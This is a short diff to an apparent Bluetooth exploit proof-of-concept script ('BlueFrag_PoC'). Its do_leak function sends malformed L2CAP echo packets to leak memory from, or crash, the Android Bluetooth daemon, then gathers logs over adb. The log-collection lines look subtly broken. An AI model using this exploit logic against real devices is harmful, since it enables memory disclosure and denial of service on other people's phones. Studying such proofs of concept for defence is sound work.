@@ -127,7 +127,6 @@ def collect_debug_info(debug_iter):
 def do_leak(ident=42):
     global echo
     echo = False
-    send_echo_hci(41, "A"*(32))
     send_echo_hci(ident, "A"*70, l2cap_len_adj=2)
     send_echo_hci(ident+1, "B"*70, continuation_flags=1)
     #send analysis if requested
@@ -138,7 +137,7 @@ def do_leak(ident=42):
     #relaunch debug bridge after daemon crash
     if len(sys.argv) > 4:
     	time.sleep(1)
-        os.system("$bluetooth_pid=$(adb shell 'pgrep droid.bluetooth')")
+        os.system("bluetooth_pid=$(adb shell 'pgrep droid.bluetooth')")
         os.system("adb logcat --pid=$bluetooth_pid > /home/copied_wonder/BlueFrag_PoC/issue_2/2-android-logcat.txt &")
     return echo
 
